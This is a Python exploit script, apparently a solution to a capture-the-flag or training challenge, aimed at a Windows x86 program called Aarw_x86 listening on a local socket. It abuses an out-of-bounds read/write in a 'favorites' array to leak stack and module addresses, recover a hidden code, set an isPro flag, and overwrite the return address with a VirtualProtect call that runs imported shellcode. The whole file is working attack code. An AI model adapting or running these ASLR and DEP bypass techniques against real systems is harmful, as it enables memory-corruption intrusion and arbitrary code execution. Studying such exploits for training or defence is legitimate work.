from util import *
from environment import *

s = Socket("127.0.0.1", 4444)

HIDDEN_CODE_OFFSET = 0x22948  # ? Aarw_x86!hiddenCode - Aarw_x86
IS_PRO_ADDRESS = 0x2294C  # ? Aarw_x86!isPro - Aarw_x86
RET_OFFSET = 0x1482  # ? Aarw_x86!__scrt_common_main_seh+0xfd - Aarw_x86

# pushed ebp address and value -> ? bp Aarw_x86!main; p 6; dd esp L1

OFFSET_FAVORITES_TO_STACK_PUSHED_EBP = 0x40
OFFSET_EBP_TO_FAVORITES = 0x9C

OFFSET_FAVORITES_TO_BASE_THREAD_INIT_THUNK = 0xA0
OFFSET_FAVORITES_TO_RET = OFFSET_FAVORITES_TO_STACK_PUSHED_EBP + 4


def cmd():
    return s.recvuntil(b"cmd: ")


def send_n(n: int):
    s.send(f"{n}\r\n".encode("utf-8"))


def input_number(n: int):
    s.recvuntil(b"Input number (1-10): ")
    send_n(n)


def read_mem(address: int, favorites_address: int):
    send_n(3)
    s.recvuntil(b"What number do you want to read? (You can choose 1 to 10) ")
    send_n((address - favorites_address) // 4 + 1)
    msg = s.recvuntil(b"\n").decode("utf-8")
    num = msg.split("is")[1].strip()
    return int(num)


def read_mem_by_offset(bytes_offset: int):
    send_n(3)
    s.recvuntil(b"What number do you want to read? (You can choose 1 to 10) ")
    send_n(bytes_offset // 4 + 1)
    msg = s.recvuntil(b"\n").decode("utf-8")
    num = msg.split("is")[1].strip()
    return int(num)


def register_fav_number(num: int):
    s.recvuntil(b"Input your favorite value: ")
    send_n(num)


def write_mem(address: int, value: int, favorites_address: int):
    send_n(2)
    s.recvuntil(b"What number do you want to overwrite? (You can choose 1 to 10) ")
    send_n((address - favorites_address) // 4 + 1)
    register_fav_number(value)


def enter_hidden_mode(hidden_code: int):
    send_n(1)
    s.recvuntil(b"hidden code: ")
    send_n(hidden_code)
    msg = s.recvuntil(b"\n")
    print(msg)


def generate_payload(shell_code_address: int, virtualProtectStub_address: int) -> bytes:
    payload = b""
    payload += b"B" * OFFSET_FAVORITES_TO_RET  # padding
    payload += le32(virtualProtectStub_address)
    payload += le32(shell_code_address)
    payload += le32(shell_code_address)
    payload += le32(len(X86_SHELL_CODE))
    payload += le32(0x40)
    payload += le32(shell_code_address - 7 * 4)  # padding area
    payload += X86_SHELL_CODE
    payload += b"B" * (4 - len(payload) % 4)

    return payload


def main():
    s.connect()
    cmd()

    # dummy write
    for _ in range(10):
        send_n(2)
        register_fav_number(1)
        cmd()

    ebp = read_mem_by_offset(OFFSET_FAVORITES_TO_STACK_PUSHED_EBP)
    print(f"ebp: 0x{ebp:x}")
    favorites_address = ebp - OFFSET_EBP_TO_FAVORITES
    print(f"favorites base: 0x{favorites_address:x}")

    cmd()
    exe_base_address = read_mem_by_offset(OFFSET_FAVORITES_TO_RET) - RET_OFFSET
    print(f"exe base: 0x{exe_base_address:x}")

    cmd()
    hidden_code = read_mem(exe_base_address + HIDDEN_CODE_OFFSET, favorites_address)
    print(f"hiddenCode: 0x{hidden_code:x}")

    cmd()
    enter_hidden_mode(hidden_code)

    cmd()
    write_mem(exe_base_address + IS_PRO_ADDRESS, 1, favorites_address)
    print(cmd())

    kernel32_BaseThreadInitThunk_address = read_mem_by_offset(
        OFFSET_FAVORITES_TO_BASE_THREAD_INIT_THUNK
    )
    kernel32_address = (
        kernel32_BaseThreadInitThunk_address - X86_OFFSET_BaseThreadInitThunk
    )
    assert kernel32_address & 0xFFFF == 0

    kernel32_VirtualProtectStub_address = (
        kernel32_address + X86_OFFSET_VirtualProtectStub
    )
    print(f"kernel32!VirtualProtectStub = 0x{kernel32_VirtualProtectStub_address:x}")

    shell_code_address = favorites_address + OFFSET_FAVORITES_TO_RET + 6 * 4
    print(f"shell code address: 0x{shell_code_address:x}")
    payload = generate_payload(shell_code_address, kernel32_VirtualProtectStub_address)
    print(f"shell code size: {len(X86_SHELL_CODE)}")
    print(f"payload size: {len(payload)}")

    for i in range(0, len(payload), 4):
        value = to_u32(payload, i)
        cmd()
        address = favorites_address + i
        print(f"@0x{address:x}: 0x{value:x}")
        write_mem(address, value, favorites_address)


if __name__ == "__main__":
    main()
